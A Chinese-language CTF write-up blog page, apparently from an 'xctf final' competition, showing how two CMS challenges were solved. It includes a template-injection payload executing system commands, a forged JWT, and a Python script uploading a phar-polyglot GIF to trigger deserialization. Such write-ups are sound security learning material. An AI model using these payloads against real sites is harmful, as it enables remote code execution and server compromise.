@@ -1,0 +1,265 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xctf final  | ev11ccaatt</title>
+<link rel="shortcut icon" href="https://ev11ccaatt.github.io/favicon.ico?v=1622883881819">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ev11ccaatt.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="xctf final  | ev11ccaatt - Atom Feed" href="https://ev11ccaatt.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="warmupcms
+进去先在sql文件里找user
+
+然后拿这串hash去解密，解出来是admin@123
+那么就可以上后台了
+模板getshell
+测下路径，我们可以访问/template\www\desktop 那么可以考虑如何上传，
+..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ev11ccaatt.github.io">
+  <img class="avatar" src="https://ev11ccaatt.github.io/images/avatar.png?v=1622883881819" alt="">
+  </a>
+  <h1 class="site-title">
+    ev11ccaatt
+  </h1>
+  <p class="site-description">
+    人菜多学
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://ev11ccaatt.github.io/post/you-lian/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="https://ev11ccaatt.github.io/post/about-me/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              xctf final 
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-06-05
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="warmupcms">warmupcms</h2>
+<p>进去先在sql文件里找user</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602225018412.png" alt="image-20210602225018412" loading="lazy"></figure>
+<p>然后拿这串hash去解密，解出来是admin@123</p>
+<p>那么就可以上后台了</p>
+<h3 id="模板getshell">模板getshell</h3>
+<p>测下路径，我们可以访问/template\www\desktop 那么可以考虑如何上传，</p>
+<p>在后台的模板设置-附件 可以设置上传文件的目录，但是可以在iPHP/core/iFS.class.php中看到</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231141915.png" alt="image-20210602231141915" loading="lazy"></figure>
+<p>看到白名单，没有php，但是有htm，那么可以尝试将一个htm文件上传，然后访问。</p>
+<p>将附件设为<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231407381.png" alt="image-20210602231407381" loading="lazy"></p>
+<p>即上传到/template\www\desktop目录下</p>
+<p>然后手动访问一下<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231450364.png" alt="image-20210602231450364" loading="lazy"></p>
+<p>这里<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231540152.png" alt="image-20210602231540152" loading="lazy">并没有执行，而是要将系统设置-模板设置为</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231705052.png" alt="image-20210602231705052" loading="lazy"></figure>
+<p>然后访问首页，这时我们的代码</p>
+<pre><code>&lt;!--{if $key eq system(&quot;ls /&quot;)}--&gt; (total)&lt;!--{/if}--&gt; 
+</code></pre>
+<p>这段代码可以来看一下，可以看到这是个语法解析器（icms官方叫<a href="https://www.icmsdev.com/docs/modifiers.html">模板调节器_模板说明_iCMS文档iCMS_给我一套程序，我能搅动互联网 (icmsdev.com)</a>），有这样一句话<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210603031837346.png" alt="image-20210603031837346" loading="lazy"></p>
+<p>如果这样构造</p>
+<pre><code>&lt;!--{$a|system('ls /')}--&gt;
+</code></pre>
+<p>那么便不会执行，因为没有这个变量</p>
+<p>而在if中的话，如</p>
+<pre><code>&lt;!--{if $key eq system(&quot;ls /&quot;)}--&gt; (total)&lt;!--{/if}--&gt; 
+</code></pre>
+<p>则与有无$key无关，后面的system定会执行.那么来个phpinfo试试</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210603032451402.png" alt="image-20210603032451402" loading="lazy"></figure>
+<p>同理，system便会执行<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231819516.png" alt="image-20210602231819516" loading="lazy"></p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210602231855016.png" alt="image-20210602231855016" loading="lazy"></figure>
+<h3 id="easycms">easycms</h3>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210605145759668.png" alt="image-20210605145759668" loading="lazy"></figure>
+<p>没这个文件，所以只能复现第二个jwtauth的漏洞</p>
+<p>在app/api/controller/Base.php中有个图片上传，那么现在有个貌似能上传的地方</p>
+<p>然后来找个能访问的的php 在base.php下面就有<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210605150640303.png" alt="image-20210605150640303" loading="lazy"></p>
+<p>先访问一下<a href="http://127.0.0.1/?s=api//Base/upload">127.0.0.1/?s=api//Base/upload</a> <img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210605153734600.png" alt="image-20210605153734600" loading="lazy"></p>
+<p>要token，那么去看看，在common.php中找到生成token的地方</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210605154026003.png" alt="image-20210605154026003" loading="lazy"></figure>
+<p>追过去可以看到token的生成，那么在jwt.io就可以生成了。</p>
+<p>然后去找一下check token的地方</p>
+<p>搜索 token不能为空 找到app/api/middleware/JwtAuth.php</p>
+<p>然后在config/my.php中找到<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210605160409987.png" alt="image-20210605160409987" loading="lazy"></p>
+<p>配合app/api/middleware/JwtAuth.php 中依次查找jwt参数来构造出</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210605160704154.png" alt="image-20210605160704154" loading="lazy"></figure>
+<p>这边有碰到一个坑，这个应该用nginx起，而不是apache起，apache没有Authorization这个信息头。。。。</p>
+<p>这边建议用request去发发包，不然构造很麻烦，在网上找个tp6的链。</p>
+<pre><code class="language-python">import requests
+host = 'http://127.0.0.1'
+ses = requests.session()
+info = ses.post(host+'/?s=api/Base/upload', headers={
+    'Authorization': 
+ 	 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoiMTExMTExMTExMTEiLCJ1aWQiOiIxIiwiaXNzIjoiY2xpZW50LnhoYWRtaW4iLCJhdWQiOiJzZXJ2ZXIueGhhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.eESOuH-kuvqa-LX2orNn1fVrSfOD5QZ8iThddapTeAc'
+}, files={
+    'file': ('a.gif', open('phar6.gif', 'rb'))
+}).json()
+print(info)
+#{'status': '200', 'data': '/uploads/api/202106/60bb3aa6cb9f5.gif'}
+
+
+</code></pre>
+<p>然后去访问就行</p>
+<p>这里是完整脚本</p>
+<pre><code class="language-python">import requests
+host = 'http://127.0.0.1'
+ses = requests.session()
+info = ses.post(host+'/?s=api/Base/upload', headers={
+    'Authorization': 
+        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoiMTExMTExMTExMTEiLCJ1aWQiOiIxIiwiaXNzIjoiY2xpZW50LnhoYWRtaW4iLCJhdWQiOiJzZXJ2ZXIueGhhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.eESOuH-kuvqa-LX2orNn1fVrSfOD5QZ8iThddapTeAc'
+}, files={
+    'file': ('a.gif', open('phar6.gif', 'rb'))
+}).json()
+print(info)
+req = ses.get(host, params={
+    's': 'api/Base/checkFileExists',
+    'filepath': info['data']
+})
+print(req.text[-200:1])
+#{'status': '200', 'data': '/uploads/api/202106/60bb3aa6cb9f5.gif'}
+
+
+</code></pre>
+<p>最后我这里没有拿到shell，是因为我用的win搭的环境</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#warmupcms">warmupcms</a>
+<ul>
+<li><a href="#%E6%A8%A1%E6%9D%BFgetshell">模板getshell</a></li>
+<li><a href="#easycms">easycms</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ev11ccaatt.github.io/post/dc-6/">
+              <h3 class="post-title">
+                DC-6
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ev11ccaatt.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
